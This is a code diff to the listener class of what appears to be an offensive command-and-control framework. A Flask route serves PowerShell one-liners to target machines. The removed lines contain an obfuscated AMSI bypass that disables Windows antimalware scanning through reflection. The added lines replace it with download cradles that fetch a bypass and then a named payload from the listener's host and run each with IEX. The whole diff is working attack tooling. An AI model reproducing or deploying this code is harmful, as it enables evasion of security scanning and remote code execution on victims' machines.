@@ -92,8 +92,8 @@ class Listener:
 
         @self.app.route("/sc/<name>", methods=['GET'])
         def sendScript(name):
-            amsi     = "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),(\"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} ); "
-            oneliner = "{}IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/{}\')".format(amsi,self.ipaddress,str(self.port),name)
+            amsi     = "IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/amsi\')".format(self.ipaddress,str(self.port))
+            oneliner = "{};Start-Sleep 2;IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/{}\')".format(amsi,self.ipaddress,str(self.port),name)
         
             return (oneliner, 200)
 
